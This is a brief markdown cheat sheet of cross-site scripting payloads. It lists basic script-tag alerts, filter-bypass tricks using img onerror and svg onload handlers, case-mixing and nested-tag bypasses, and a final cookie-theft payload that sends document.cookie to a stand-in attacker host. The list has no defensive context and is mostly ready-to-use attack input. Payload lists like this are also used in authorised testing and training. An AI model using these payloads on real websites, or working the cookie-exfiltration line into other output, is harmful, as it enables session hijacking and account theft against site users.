## XSS Payloads
```javascript
-- Basic
<script>alert(1)</script>
-- Filter bypass
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
-- Case bypass
<sCrIpt>alert(1)</sCrIpt>
-- Nested
<scr<script>ipt>alert(1)</script>
-- Cookie theft
<script>document.location='http://attacker.com/?c='+document.cookie</script>
```
